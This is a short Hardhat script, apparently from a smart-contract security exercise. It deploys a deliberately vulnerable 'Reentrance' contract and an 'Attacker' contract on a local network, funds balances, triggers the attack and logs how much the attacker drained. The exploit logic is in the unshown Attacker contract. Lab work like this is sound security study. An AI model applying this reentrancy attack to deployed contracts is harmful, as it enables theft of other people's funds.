const hre = require("hardhat");

async function main() {

    const [first, second, third] = (await hre.ethers.getSigners());
    const Reentrance = await hre.ethers.getContractFactory("Reentrance");
    const reentrance = await Reentrance.deploy();

    console.log("reentrance deployed at : ", reentrance.address);

    const Attacker = await hre.ethers.getContractFactory("Attacker");
    const attacker = await Attacker.deploy(reentrance.address, { value: hre.ethers.utils.parseEther("1.0") });

    reentrance.donate(attacker.address, { value: hre.ethers.utils.parseEther("0.5") })
    reentrance.donate(first.address, { value: hre.ethers.utils.parseEther("0.5") })
    reentrance.donate(second.address, { value: hre.ethers.utils.parseEther("0.5") })
    reentrance.donate(third.address, { value: hre.ethers.utils.parseEther("0.5") })

    let attackersBalance = await reentrance.balanceOf(attacker.address);

    console.log(attackersBalance);


    await attacker.attack();

    const finalBalance = await hre.waffle.provider.getBalance(attacker.address);

    console.log("attackers balance :", finalBalance);

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
